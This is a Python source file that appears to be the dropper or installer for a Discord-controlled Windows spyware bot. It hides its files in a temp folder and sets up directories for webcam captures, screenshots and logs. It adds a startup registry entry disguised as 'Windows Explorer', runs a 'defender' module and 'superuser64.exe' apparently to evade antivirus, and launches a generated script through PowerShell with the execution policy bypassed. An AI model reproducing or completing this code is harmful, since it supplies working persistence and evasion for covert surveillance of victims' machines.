# coding=UTF-8

import asyncio
import filecmp
import os
import subprocess
import venv
import ThreadManager
import sys


async def Hide():
    folderTarg = "%temp%\\123456789\\"
    payload = r"echo {}".format(folderTarg)
    execute = subprocess.run(payload, shell=True, capture_output=True)
    folder = execute.stdout
    print(folder.decode(encoding="utf-8"))
    folder = folder.decode(encoding="utf-8")
    folderstr = folder.replace(r"\\", "\\").replace("\r\n", "")
    print(folderstr)

    try:
        await getSettled(folderstr)
    except Exception as e:
        print("An error has occured: " + str(e))
    os.chdir(folderstr)



async def getSettled(targetDir):
    try:
        os.mkdir(targetDir)
        os.mkdir("{}\\downloads".format(targetDir))
        os.mkdir("{}\\WebcamCaptures".format(targetDir))
        os.mkdir("{}\\ScreenShots".format(targetDir))
        os.mkdir("{}\\logs".format(targetDir))
    except FileExistsError:
        pass
    payload = "copy .\\*.py {}\\ && copy .\\*.bat {}\\ && copy .\\.env {}\\ ".format(targetDir, targetDir, targetDir)
    copyAllNecessary = subprocess.run(payload, shell=True, capture_output=True)
    if copyAllNecessary.stderr.__len__() > 0: raise Exception(copyAllNecessary.stderr)
    
    # Create the virtual environment
    venv_dir = os.path.join(targetDir, "venv")
    venv.create(venv_dir, clear=True, with_pip=True)
    """
    # Activate the virtual environment and install packages
    activate_script = os.path.join(venv_dir, "Scripts", "activate.bat")
    pip_install_cmd = f"{activate_script}" # "; pip install intents aiohttp pillow legacy-cgi audioop-lts pynput python-dotenv opencv-python git+https://github.com/Rapptz/discord.py@master"
    goAhead = subprocess.run(pip_install_cmd, shell=True, capture_output=True)
    env = os.environ
    goAhead2 = subprocess.Popen("python.exe -m pip install pillow pynput python-dotenv opencv-python pyaudio", shell=True, env=env)
    #thread = ThreadManager.ThreadManager("DiscordPYInstall", subprocess.run(args="python.exe -m pip install git+https://github.com/Rapptz/discord.py@master",shell=True))
    subprocess.run(args="python.exe -m pip install git+https://github.com/Rapptz/discord.py@master", shell=True, env=env)
    print(goAhead.stdout.decode(), goAhead.stderr.decode(), sep="\n\n\n")"""
 

async def Activated(targetDir):
    import persist

    persist.add_to_startup_registry("Windows Explorer", "python.exe {}\\discordbot.py".format(targetDir), True)
    
    import defender

    targetFile = "downloads\\superuser64.exe /ws"
    defenderFile = ".\\defender.py && .\\ThreadManager.py"
    payload = "{0} python.exe {1}".format(targetFile, defenderFile)
    docoolstuff = subprocess.run(payload, shell=True, capture_output=True)
    print(docoolstuff.stdout.decode("utf-8"), docoolstuff.stderr.decode("utf-8"), sep="\n\n")
    
    botFile = os.path.join(targetDir, "run_discordbot.bat")
    botpayload = repr("shell=True, capture_output=True, args=f'[os.getcwd()]\\{0} powershell.exe -ExecutionPolicy Bypass -Command $& {1}$'".format(targetFile, botFile).replace("[", "{").replace("]","}"))
    print(botpayload)
    
    
    return botpayload

def checkfileinDir(dir: list, targFile:str) -> bool:
    for file in dir:
        if targFile == file:
            print("Found {}".format(targFile))
            return True
            

async def runBotBatch(payload):
    directory = os.listdir()
    botFile = None
    hopeToFindFile = "run_discordbot.bat"
    botFile = checkfileinDir(directory, hopeToFindFile)
    

    venv_python = os.path.join(os.getcwd(), "venv", "Scripts", "python.exe")
    
    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
    thread1 = ThreadManager.ThreadManager(target=printNewFile, args=payload, name="DiscordBot")
    thread1.start()
    print("Joining the writing thread")
    thread1.join()

    print("Stamping the file.")
    stampBatch()
    print("File stamped!")

    print("Starting the cool file\n\n\n\n")
    startBot2 = subprocess.Popen([venv_python, "coolfile.py"], stdout=sys.stdout, stderr=sys.stderr)
    startBot2.wait()
    
    """
    if botFile:
        print(f"Running batch file: {hopeToFindFile}")
        startBot = subprocess.Popen(hopeToFindFile, shell=True, stdout=sys.stdout, stderr=sys.stderr)
        startBot.wait()
        print("Return code:", startBot.returncode)
        
    else:
        print("Batch file run_discordbot.bat not found in the cwd: {} \n".format(os.getcwd()))
        print(directory)
        print("Trying again after 5 seconds...")
        await asyncio.sleep(5)
        botFile2 = checkfileinDir(directory, "run_discordbot.bat")
        if botFile2:
            startBot = subprocess.Popen(hopeToFindFile, shell=True, stdout=sys.stdout, stderr=sys.stderr)
            startBot.wait()
        else:
            print("Still could not find run_discordbot.bat in the cwd {}".format(os.getcwd()))
    
    print("Return code: ", startBot.returncode)
    """
    """
    print("Starting the final python installer file")
    print("{0}\\venv\\Scripts\\python.exe {1}\\coolfile.py".format(os.getcwd(), os.getcwd()))
    proc = await asyncio.create_subprocess_exec(
        sys.executable, 
        "{0}\\venv\\Scripts\\python.exe".format(os.getcwd()), 
        "{0}\\coolfile.py".format(os.getcwd()),
        "coolfile.py", 
        stdout=asyncio.subprocess.PIPE, 
        stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await proc.communicate()
    if stdout:
        print(stdout.decode())
    if stderr:
        print(stderr.decode())"""

def stampBatch():
    batch_file_path = os.path.join(os.getcwd(), "run_discordbot.bat")
    with open(batch_file_path, "r", encoding="utf-8") as file:
        allAsList = file.readlines()

    newerList = []
    for i in allAsList:
        if "&&CURDIR&&" in i:
            print("FOUND &&CURDIR&& \nLine = {}".format(i))
            i = i.replace("&&CURDIR&&", os.getcwd())
        elif "&&VENVDIR&&" in i:
            print("FOUND &&VENVDIR&& \nLine = {}".format(i))
            i = i.replace("&&VENVDIR&&", os.path.join(os.getcwd(), "venv"))
        newerList.append(i)
    with open(batch_file_path, "w", encoding="utf-8") as file:
        file.writelines(newerList)
    print("Batch file updated!")

def printNewFile(payload):
    fileConts = f"""
# coding=UTF-8

import subprocess
import os

class NewFile:
    def __init__(self):
        self.thread = subprocess.run({payload})#text=True)
        print('SUCCESS STARTING NEW THREAD')
        print(self.thread.stdout)
        print(self.thread.stderr)

if __name__ == '__main__':
    main = NewFile()
    print(main.thread.returncode)
    print(main.thread.args)
""".replace("\"", "").replace("$", "\"")
    print(payload, "\n\n\n\n")
    print(fileConts)
    with open("coolfile.py", "w", encoding="utf-8") as file:
        file.write(fileConts)
    print("Writing thread writing to stdout: FINISHED")



async def main():
    
    await Hide()
    act = await Activated(os.getcwd())
    print(act)
    #await asyncio.sleep(10)
    await runBotBatch(act)
    print("Hoi from async")

if __name__ == "__main__":
    asyncio.run(main())
    print("Hoi from main")